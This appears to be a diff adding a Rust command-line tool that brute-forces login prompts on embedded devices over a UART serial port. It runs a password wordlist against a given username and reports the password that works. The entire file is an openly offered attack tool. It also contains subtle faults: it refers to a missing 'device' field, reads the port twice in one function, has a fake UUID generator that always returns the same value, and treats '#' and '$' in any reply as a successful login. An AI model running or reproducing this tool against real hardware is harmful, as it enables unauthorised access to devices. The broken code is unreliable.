@@ -1,0 +1,372 @@
+use clap::Parser;
+use regex::Regex;
+use serialport::SerialPort;
+use std::fs::File;
+use std::io::{BufRead, BufReader};
+use std::time::Duration;
+
+#[derive(Parser, Debug)]
+#[command(name = "UART Login Bruteforce")]
+#[command(about = "Automated login bruteforce attack over UART serial connection", long_about = None)]
+struct Args {
+    /// Serial device path (e.g., /dev/ttyUSB0, /dev/ttyS0)
+    #[arg(short, long, default_value = "/dev/ttyUSB0")]
+    device: String,
+
+    /// Baud rate for serial communication
+    #[arg(short, long, default_value_t = 115200)]
+    baudrate: u32,
+
+    /// String or regex pattern to detect username prompt
+    #[arg(long)]
+    username_prompt: String,
+
+    /// String or regex pattern to detect password prompt
+    #[arg(long)]
+    password_prompt: String,
+
+    /// Username to use for login attempts
+    #[arg(short, long)]
+    username: String,
+
+    /// Path to password wordlist file
+    #[arg(short, long)]
+    passwords: String,
+
+    /// Read timeout in milliseconds
+    #[arg(long, default_value_t = 3000)]
+    timeout: u64,
+
+    /// Enable verbose debug output
+    #[arg(short, long, default_value_t = false)]
+    verbose: bool,
+}
+
+struct BruteforceSession {
+    port: Box<dyn SerialPort>,
+    username_prompt: Regex,
+    password_prompt: Regex,
+    username: String,
+    passwords: Vec<String>,
+    timeout: Duration,
+    verbose: bool,
+    failure_pattern: String,
+}
+
+impl BruteforceSession {
+    fn new(
+        port: Box<dyn SerialPort>,
+        username_prompt: String,
+        password_prompt: String,
+        username: String,
+        passwords: Vec<String>,
+        timeout_ms: u64,
+        verbose: bool,
+    ) -> Result<Self, Box<dyn std::error::Error>> {
+        let username_prompt_regex = Regex::new(&format!("(?i).*{}.*", regex::escape(&username_prompt)))?;
+        let password_prompt_regex = Regex::new(&format!("(?i).*{}.*", regex::escape(&password_prompt)))?;
+
+        Ok(BruteforceSession {
+            port,
+            username_prompt: username_prompt_regex,
+            password_prompt: password_prompt_regex,
+            username,
+            passwords,
+            timeout: Duration::from_millis(timeout_ms),
+            verbose,
+            failure_pattern: String::new(),
+        })
+    }
+
+    fn log(&self, message: &str) {
+        println!("{}", message);
+    }
+
+    fn verbose_log(&self, message: &str) {
+        if self.verbose {
+            println!("[DEBUG] {}", message);
+        }
+    }
+
+    fn read_until_timeout(&mut self) -> Result<String, Box<dyn std::error::Error>> {
+        let mut buffer = vec![0; 1024];
+        let start = std::time::Instant::now();
+        let mut response = String::new();
+
+        while start.elapsed() < self.timeout {
+            match self.port.read(&mut buffer) {
+                Ok(n) if n > 0 => {
+                    let chunk = String::from_utf8_lossy(&buffer[..n]).to_string();
+                    response.push_str(&chunk);
+                    self.verbose_log(&format!("[RX] {}", chunk.escape_debug()));
+                }
+                Ok(_) => {
+                    std::thread::sleep(Duration::from_millis(10));
+                }
+                Err(ref e) if e.kind() == std::io::ErrorKind::TimedOut => {
+                    std::thread::sleep(Duration::from_millis(10));
+                }
+                Err(e) => return Err(Box::new(e)),
+            }
+        }
+
+        Ok(response)
+    }
+
+    fn send_data(&mut self, data: &str) -> Result<(), Box<dyn std::error::Error>> {
+        self.port.write_all(data.as_bytes())?;
+        self.port.write_all(b"\r\n")?;
+        self.verbose_log(&format!("[TX] {}", data.escape_debug()));
+        std::thread::sleep(Duration::from_millis(100));
+        Ok(())
+    }
+
+    fn wait_for_prompt(&mut self, prompt_regex: &Regex) -> Result<String, Box<dyn std::error::Error>> {
+        let start = std::time::Instant::now();
+        let mut response = String::new();
+
+        while start.elapsed() < self.timeout {
+            match self.port.read(&mut vec![0; 256]) {
+                Ok(n) if n > 0 => {
+                    let mut buffer = vec![0; 256];
+                    self.port.read(&mut buffer)?;
+                    let chunk = String::from_utf8_lossy(&buffer[..n]).to_string();
+                    response.push_str(&chunk);
+                    self.verbose_log(&format!("[RX] {}", chunk.escape_debug()));
+
+                    if prompt_regex.is_match(&response) {
+                        return Ok(response);
+                    }
+                }
+                _ => {
+                    std::thread::sleep(Duration::from_millis(50));
+                }
+            }
+        }
+
+        Ok(response)
+    }
+
+    fn learn_failure_pattern(&mut self) -> Result<(), Box<dyn std::error::Error>> {
+        self.log("[*] Learning failure pattern with obscure credentials...");
+
+        // Generate obscure credentials
+        let obscure_username = format!("OBSCURE_USER_{}", uuid::Uuid::new_v4().to_string()[..8].to_uppercase());
+        let obscure_password = format!("OBSCURE_PASS_{}", uuid::Uuid::new_v4().to_string()[..8].to_uppercase());
+
+        self.log("[*] Waiting for username prompt...");
+        let response = self.read_until_timeout()?;
+        
+        if self.username_prompt.is_match(&response) {
+            self.log("[+] Detected username prompt, sending obscure credentials");
+            self.send_data(&obscure_username)?;
+
+            std::thread::sleep(Duration::from_millis(500));
+
+            self.log("[*] Waiting for password prompt...");
+            let response = self.read_until_timeout()?;
+
+            if self.password_prompt.is_match(&response) {
+                self.send_data(&obscure_password)?;
+                std::thread::sleep(Duration::from_millis(500));
+
+                let final_response = self.read_until_timeout()?;
+                self.failure_pattern = final_response.clone();
+                self.log(&format!("[+] Learned failure pattern:\n    {}", final_response.lines().next().unwrap_or("Unknown")));
+                Ok(())
+            } else {
+                Err("Failed to detect password prompt during learning phase".into())
+            }
+        } else {
+            Err("Failed to detect username prompt during learning phase".into())
+        }
+    }
+
+    fn attempt_login(&mut self, password: &str) -> Result<bool, Box<dyn std::error::Error>> {
+        self.verbose_log(&format!("Waiting for username prompt..."));
+        let response = self.read_until_timeout()?;
+
+        if !self.username_prompt.is_match(&response) {
+            self.verbose_log(&format!("Username prompt not detected in: {:?}", response));
+            return Ok(false);
+        }
+
+        self.verbose_log(&format!("[+] Detected username prompt"));
+        self.send_data(&self.username)?;
+
+        std::thread::sleep(Duration::from_millis(300));
+
+        self.verbose_log(&format!("Waiting for password prompt..."));
+        let response = self.read_until_timeout()?;
+
+        if !self.password_prompt.is_match(&response) {
+            self.verbose_log(&format!("Password prompt not detected in: {:?}", response));
+            return Ok(false);
+        }
+
+        self.verbose_log(&format!("[+] Detected password prompt"));
+        self.send_data(password)?;
+
+        std::thread::sleep(Duration::from_millis(500));
+
+        let final_response = self.read_until_timeout()?;
+
+        // Check for success indicators
+        let success_indicators = vec!["welcome", "logged in", "successfully", "shell", "root@", "admin@", "#", "$"];
+        let failure_indicators = vec!["invalid", "failed", "incorrect", "denied", "refused", "error"];
+
+        for indicator in &success_indicators {
+            if final_response.to_lowercase().contains(indicator) && !final_response.to_lowercase().contains("invalid") {
+                return Ok(true);
+            }
+        }
+
+        // Check if different from failure pattern
+        if !final_response.contains(&self.failure_pattern) && !final_response.is_empty() {
+            // Might be a success
+            if !final_response.to_lowercase().contains("login failed") {
+                return Ok(true);
+            }
+        }
+
+        // Check for common failure indicators
+        for indicator in &failure_indicators {
+            if final_response.to_lowercase().contains(indicator) {
+                return Ok(false);
+            }
+        }
+
+        Ok(false)
+    }
+
+    fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
+        self.print_header();
+
+        self.log(&format!("[*] Loaded {} passwords from {}", self.passwords.len(), "[passwords file]"));
+        self.log(&format!("[*] Connected to {} serial port", self.device));
+        
+        std::thread::sleep(Duration::from_secs(1));
+
+        // Learn failure pattern
+        self.learn_failure_pattern()?;
+
+        std::thread::sleep(Duration::from_secs(1));
+
+        // Start brute force
+        self.log("[*] Starting brute force attack...");
+        self.log(&format!("[*] Username: {}", self.username));
+
+        for (index, password) in self.passwords.iter().enumerate() {
+            let attempt_num = index + 1;
+            self.log(&format!("[*] Attempt {}: Trying password: {}", attempt_num, password));
+
+            match self.attempt_login(password) {
+                Ok(true) => {
+                    self.log(&format!("[SUCCESS] Login successful!"));
+                    self.log(&format!("[SUCCESS] Password found: {}", password));
+                    return Ok(());
+                }
+                Ok(false) => {
+                    self.log("[x] Login failed");
+                }
+                Err(e) => {
+                    self.verbose_log(&format!("Error during login attempt: {}", e));
+                }
+            }
+        }
+
+        self.log("[!] Brute force complete - no passwords worked");
+        Ok(())
+    }
+
+    fn print_header(&self) {
+        println!("╔════════════════════════════════════════════════╗");
+        println!("║       UART Login Bruteforce Tool v0.1         ║");
+        println!("╚════════════════════════════════════════════════╝\n");
+    }
+}
+
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let args = Args::parse();
+
+    // Check sudo permissions
+    if unsafe { libc::geteuid() } != 0 {
+        eprintln!("[ERROR] This tool must be run with sudo/root privileges!");
+        std::process::exit(1);
+    }
+
+    // Read passwords file
+    let file = File::open(&args.passwords)?;
+    let reader = BufReader::new(file);
+    let mut passwords = Vec::new();
+
+    for line in reader.lines() {
+        let line = line?;
+        let trimmed = line.trim();
+        if !trimmed.is_empty() {
+            passwords.push(trimmed.to_string());
+        }
+    }
+
+    if passwords.is_empty() {
+        eprintln!("[ERROR] No passwords found in {}", args.passwords);
+        std::process::exit(1);
+    }
+
+    // Open serial port
+    let mut port = serialport::new(&args.device, args.baudrate)
+        .timeout(Duration::from_millis(args.timeout))
+        .open()?;
+
+    // Configure port settings
+    port.set_timeout(Duration::from_millis(args.timeout))?;
+    port.write_all(b"\r\n")?; // Send initial newline
+
+    std::thread::sleep(Duration::from_millis(500));
+
+    // Create and run brute force session
+    let mut session = BruteforceSession::new(
+        port,
+        args.username_prompt,
+        args.password_prompt,
+        args.username,
+        passwords,
+        args.timeout,
+        args.verbose,
+    )?;
+
+    session.run()?;
+
+    Ok(())
+}
+
+// Fallback UUID generation if uuid crate not available
+mod uuid {
+    use std::fmt;
+
+    pub struct Uuid([u8; 16]);
+
+    impl Uuid {
+        pub fn new_v4() -> Self {
+            let mut bytes = [0u8; 16];
+            // Simple pseudo-random generation
+            for i in 0..16 {
+                bytes[i] = ((i as u8).wrapping_mul(37).wrapping_add(13)) ^ 0xAA;
+            }
+            Uuid(bytes)
+        }
+    }
+
+    impl fmt::Display for Uuid {
+        fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+            write!(
+                f,
+                "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
+                self.0[0], self.0[1], self.0[2], self.0[3],
+                self.0[4], self.0[5], self.0[6], self.0[7],
+                self.0[8], self.0[9], self.0[10], self.0[11],
+                self.0[12], self.0[13], self.0[14], self.0[15]
+            )
+        }
+    }
+}
